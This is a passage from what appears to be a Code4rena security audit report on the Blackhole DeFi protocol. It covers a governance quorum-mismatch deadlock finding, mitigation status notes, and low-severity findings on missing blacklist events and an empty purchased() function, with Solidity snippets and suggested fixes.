<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Apply governance-controlled tailEmissionRate from prior vote</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Note: tailEmissionRate will have been set via `nudge()`</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_weekly</span><span class="mtk1"> = (</span><span class="mtk12">_weekly</span><span class="mtk1"> * </span><span class="mtk12">tailEmissionRate</span><span class="mtk1">) / </span><span class="mtk12">MAX_BPS</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
<p>This allows the DAO to truly control emissions starting at epoch 67, as promised in the docs.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-45">rayss</a>.</p>
<hr>
<h2 style="position:relative;" id="m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch"><a class="anchor before" aria-label="m 22 governance deadlock potential in blackgovernorsol due to quorum mismatch permalink" href="#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-57">[M-22] Governance deadlock potential in <code>BlackGovernor.sol</code> due to quorum mismatch</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-52">spectr</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91</a></p>
<h3 style="position:relative;" id="finding-description-12"><a class="anchor before" aria-label="finding description 12 permalink" href="#finding-description-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<ul>
<li><strong>Severity</strong>: Medium</li>
<li>
<p><strong>Affected contracts</strong>:</p>
<ul>
<li><code>contracts/BlackGovernor.sol</code></li>
<li><code>contracts/VotingEscrow.sol</code> (as the source of <code>getPastTotalSupply</code> and <code>smNFTBalance</code>)</li>
<li><code>contracts/MinterUpgradeable.sol</code> (as the target of the <code>nudge()</code> function)</li>
</ul>
</li>
</ul>
<p>The mechanism for proposals in <code>BlackGovernor.sol</code> has a fundamental mismatch between how the <code>proposalThreshold</code> is determined and how the <code>quorum</code> is calculated.</p>
<ol>
<li>
<p><strong>Proposal Threshold</strong>: Determined by <code>proposalThreshold()</code>, which requires a percentage (default 0.2%, configurable by <code>team</code> up to 10%) of the <em>total current <code>veBLACK</code> voting power</em>. This includes voting power from both regular <code>veNFT</code> locks and Supermassive NFTs (smNFTs).</p>
<pre data-index="76" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// contracts/BlackGovernor.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">proposalThreshold</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">getPastTotalSupply</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">) * </span><span class="mtk12">proposalNumerator</span><span class="mtk1">) / </span><span class="mtk12">PROPOSAL_DENOMINATOR</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// token.getPastTotalSupply() resolves to VotingEscrow.totalSupplyAtT(timestamp)</span></span></span></code></pre>
</li>
<li>
<p><strong>Quorum</strong>: Determined by <code>quorum()</code>, which requires 4% of <code>token.getsmNFTPastTotalSupply()</code>. This <code>getsmNFTPastTotalSupply()</code> resolves to <code>VotingEscrow.smNFTBalance</code>.</p>
<p><code>VotingEscrow.smNFTBalance</code> represents the cumulative sum of <em>principal <code>BLACK</code> tokens ever burned</em> to create or upgrade to smNFTs. This <code>smNFTBalance</code> value only ever increases. The 4% of this principal amount is then used as the target for the <em>total voting power</em> that must be cast in favor of a proposal.</p>
<pre data-index="77" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// contracts/BlackGovernor.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">quorum</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">blockTimestamp</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">getsmNFTPastTotalSupply</span><span class="mtk1">() * </span><span class="mtk11">quorumNumerator</span><span class="mtk1">()) / </span><span class="mtk11">quorumDenominator</span><span class="mtk1">(); </span><span class="mtk3">// quorumNumerator is 4</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// token.getsmNFTPastTotalSupply() resolves to VotingEscrow.smNFTBalance</span></span></span></code></pre>
<p>This creates a situation where the ability to propose is based on overall <code>veBLACK</code> voting power distribution, but the ability for a proposal to pass (quorum) is heavily tied to a growing, historical sum of burned <code>BLACK</code> for smNFTs, which might not correlate with active smNFT voting participation or the total active voting power.</p>
</li>
</ol>
<h3 style="position:relative;" id="risk-and-impact-1"><a class="anchor before" aria-label="risk and impact 1 permalink" href="#risk-and-impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Risk and Impact</h3>
<p>The primary risk is a <strong>Denial of Service (DoS)</strong> for the <code>MinterUpgradeable.nudge()</code> function, which is the <em>only</em> function <code>BlackGovernor.sol</code> can call.</p>
<ul>
<li>
<p><strong>Governance deadlock scenario (Medium risk)</strong>: As the protocol matures, <code>VotingEscrow.smNFTBalance</code> (total <code>BLACK</code> principal burned for smNFTs) can grow significantly. If this balance becomes very large, the 4% quorum target (in terms of required voting power) can become unachievably high for the following reasons:</p>
<ul>
<li>Active smNFT holders might be a small fraction of the total <code>smNFTBalance</code> contributors (e.g., due to inactive early minters).</li>
<li>The collective voting power of active smNFT holders who support a given proposal might be insufficient to meet this high quorum.</li>
<li>A user or group could meet the <code>proposalThreshold()</code> using voting power from regular <code>veBLACK</code> locks, but their proposal would consistently fail if the smNFT-derived quorum is not met by other voters. This leads to the <code>nudge()</code> function becoming unusable, preventing any future adjustments to the tail emission rate via this governor.</li>
</ul>
</li>
<li><strong>Governance spam</strong>: A secondary consequence is the potential for governance “spam,” where proposals are repeatedly created meeting the threshold but are destined to fail due to the quorum structure, causing on-chain noise.</li>
<li><strong>Contrast - low quorum scenario (Informational)</strong>: Conversely, if <code>smNFTBalance</code> is very low (e.g., early in the protocol, or if smNFTs are unpopular), the quorum can be trivially met, potentially allowing a small group (that meets proposal threshold) to easily control the <code>nudge()</code> function. This aspect was previously noted but provides context to the design’s sensitivity to <code>smNFTBalance</code>.</li>
<li>
<p><strong>Illustrative deadlock scenario</strong>:</p>
<ol>
<li>The <code>smNFTBalance</code> in <code>VotingEscrow.sol</code> has grown to a large number (e.g., 10,000,000 <code>BLACK</code> principal burned).</li>
<li>The quorum target, in terms of voting power, becomes 4% of this, i.e., equivalent to the voting power derived from 400,000 <code>BLACK</code> (if it were all smNFTs with average lock/bonus).</li>
<li>A group of users (“Proposers”) accumulates 0.2% of the total <code>veBLACK</code> voting power (e.g., from a mix of regular and some smNFT locks) and creates a proposal to <code>nudge()</code> emissions.</li>
<li>Many of the smNFTs contributing to the <code>smNFTBalance</code> were created by users who are now inactive or do not vote on this proposal.</li>
<li>The active smNFT holders, plus the Proposers’ own smNFT voting power, sum up to less than the 400,000 <code>BLACK</code> equivalent voting power required for quorum.</li>
<li>The proposal fails. This cycle can repeat, rendering the <code>nudge()</code> function effectively disabled.</li>
</ol>
</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-23"><a class="anchor before" aria-label="recommended mitigation steps 23 permalink" href="#recommended-mitigation-steps-23"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>The current quorum mechanism presents a significant risk to the intended functionality of <code>BlackGovernor.sol</code>. Consider the following:</p>
<ul>
<li><strong>Align quorum base</strong>: Modify the quorum calculation to be based on a metric more aligned with active participation or total voting power, similar to the <code>proposalThreshold</code>. For example, base the quorum on a percentage of <code>token.getPastTotalSupply(block.timestamp)</code> (total <code>veBLACK</code> voting power).</li>
<li>
<p><strong>Adaptive quorum</strong>: Implement an adaptive quorum mechanism. This could involve:</p>
<ul>
<li>A quorum that adjusts based on recent voting participation in <code>BlackGovernor</code> proposals.</li>
<li>A system where the contribution of an smNFT to the <code>smNFTBalance</code> (for quorum calculation purposes, not its actual voting power) decays over time if the smNFT is inactive in governance.</li>
</ul>
</li>
<li><strong>Dual quorum condition</strong>: Consider requiring the lesser of two quorum conditions to be met: e.g., (4% of <code>smNFTBalance</code>-derived voting power) OR (X% of total <code>veBLACK</code> voting power). This provides a fallback if <code>smNFTBalance</code> becomes disproportionately large or inactive.</li>
<li><strong>Documentation and monitoring</strong>: If the current design is retained, thoroughly document the rationale and potential long-term implications. Continuously monitor <code>smNFTBalance</code> growth versus active smNFT voting participation and total <code>veBLACK</code> supply to assess if the <code>nudge()</code> function’s viability is threatened.</li>
</ul>
<p><strong>Blackhole marked as informative</strong></p>
<hr>
<h1 style="position:relative;" id="low-risk-and-non-critical-issues"><a class="anchor before" aria-label="low risk and non critical issues permalink" href="#low-risk-and-non-critical-issues"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Low Risk and Non-Critical Issues</h1>
<p>For this audit, 13 reports were submitted by wardens detailing low risk and non-critical issues. The <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-341">report highlighted below</a> by <strong>rayss</strong> received the top score from the judge.</p>
<p><em>The following wardens also submitted reports: <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-80">Chapo</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-448">GaurangBrdv</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-36">golomp</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-1">Harisuthan</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-484">IzuMan</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-368">K42</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-22">mihailvichev</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-351">mnedelchev_</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-439">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-531">Sparrow</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-207">zhanmingjing</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-191">ZZhelev</a>.</em></p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Description</th>
<th>Severity</th>
</tr>
</thead>
<tbody>
<tr>
<td>[01]</td>
<td>Early returning in <code>_blacklist()</code> and <code>blacklistConnector</code> function prevents emission of blacklisted event and blacklistConnector event respectively</td>
<td>Low</td>
</tr>
<tr>
<td>[02]</td>
<td>Incomplete implementation of <code>purchased</code> function in Auction contract</td>
<td>Low</td>
</tr>
<tr>
<td>[03]</td>
<td>Stack too deep error in inline assembly (variable <code>headStart</code>)</td>
<td>Low</td>
</tr>
<tr>
<td>[04]</td>
<td>Hardcoded manager lacks ability to renounce control</td>
<td>Low</td>
</tr>
<tr>
<td>[05]</td>
<td>Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT</td>
<td>Low</td>
</tr>
<tr>
<td>[06]</td>
<td><code>getVotes()</code> wiew function becomes unusable when a user owns too many locks</td>
<td>Low</td>
</tr>
<tr>
<td>[07]</td>
<td><code>distributeAll()</code> function at risk of repeated failure due to unbounded loop over gauges</td>
<td>Low</td>
</tr>
<tr>
<td>[08]</td>
<td>Fee recipient may remain set to previous owner</td>
<td>Low</td>
</tr>
<tr>
<td>[09]</td>
<td>Incorrect <code>setRouter</code> function only allows zero address to pass</td>
<td>Low</td>
</tr>
<tr>
<td>[10]</td>
<td>Misaligned access control on <code>setTopNPools()</code> function</td>
<td>Low</td>
</tr>
<tr>
<td>[11]</td>
<td>Governance/centralization Risks (21 contracts covered)</td>
<td>Governance</td>
</tr>
<tr>
<td>[12]</td>
<td>Function declaration does not follow Solidity style guide at <code>FixedAuction.sol</code></td>
<td>Non-Critical</td>
</tr>
<tr>
<td>[13]</td>
<td>Incorrect require statement for address check at <code>GaugeV2.sol</code></td>
<td>Non-Critical</td>
</tr>
</tbody>
</table>
<p><em>Note: QA report issues determined invalid by the judge have been removed from the final report.</em> </p>
<h2 style="position:relative;" id="01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively"><a class="anchor before" aria-label="01 early returning in _blacklist and blacklistconnector function prevents emission of blacklisted event and blacklistconnector event respectively permalink" href="#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[01] Early returning in <code>_blacklist()</code> and <code>blacklistConnector</code> function prevents emission of blacklisted event and blacklistConnector event respectively</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L83">Link to the blacklist function</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L131">Link to the blacklistConnector function</a></p>
<h3 style="position:relative;" id="finding-description-13"><a class="anchor before" aria-label="finding description 13 permalink" href="#finding-description-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>In the <code>_blacklist</code> function, a token is removed from the whitelist if it exists. However, the Blacklisted event — intended to log successful blacklist actions — is only emitted when the token is not found in the whiteListed array. Due to an early return statement inside the loop, the event is never emitted upon a successful removal, resulting in inconsistent logging and reduced transparency for off-chain indexers or UI components.</p>
<p>NOTE: The exact same issue lies in the <code>blacklistConnector</code> function, it returns early leading to the event not being emitted.</p>
<h3 style="position:relative;" id="impact-13"><a class="anchor before" aria-label="impact 13 permalink" href="#impact-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Successful blacklist operations are not logged via events, reducing traceability.</li>
<li>Successfully removing a token from the list of connectors are not logged via events.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-24"><a class="anchor before" aria-label="recommended mitigation steps 24 permalink" href="#recommended-mitigation-steps-24"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Move the emit Blacklisted(…) statement inside the for-loop and place it before the return, to ensure the event is emitted only when the token is actually removed:</p>
<p>For the <code>_blacklist</code> function:</p>
<pre data-index="78" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">whiteListed</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] == </span><span class="mtk12">_token</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">whiteListed</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] = </span><span class="mtk12">whiteListed</span><span class="mtk1">[</span><span class="mtk12">length</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">whiteListed</span><span class="mtk1">.</span><span class="mtk11">pop</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Blacklisted</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">_token</span><span class="mtk1">); </span><span class="mtk3">// Emit before return</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>For the <code>blacklistConnector</code> function:</p>
<pre data-index="79" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">connectors</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] == </span><span class="mtk12">_token</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">connectors</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] = </span><span class="mtk12">connectors</span><span class="mtk1">[</span><span class="mtk12">length</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">]; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">connectors</span><span class="mtk1">.</span><span class="mtk11">pop</span><span class="mtk1">(); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">BlacklistConnector</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">_token</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk15">return</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h2 style="position:relative;" id="02-incomplete-implementation-of-purchased-function-in-auction-contract"><a class="anchor before" aria-label="02 incomplete implementation of purchased function in auction contract permalink" href="#02-incomplete-implementation-of-purchased-function-in-auction-contract"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[02] Incomplete implementation of <code>purchased</code> function in Auction contract</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37</a></p>
<h3 style="position:relative;" id="finding-description-14"><a class="anchor before" aria-label="finding description 14 permalink" href="#finding-description-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>purchased</code> function, intended to be called upon token purchases, is declared with an empty body in the deployed Auction contract. This results in the function call succeeding without performing any state updates, event emissions, or other side effects expected from purchase tracking.</p>
<pre data-index="80" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">purchased</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// empty body</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Since the function performs no operations, the auction contract does not update any internal state to reflect the purchase. This means the auction logic is incomplete.</p>
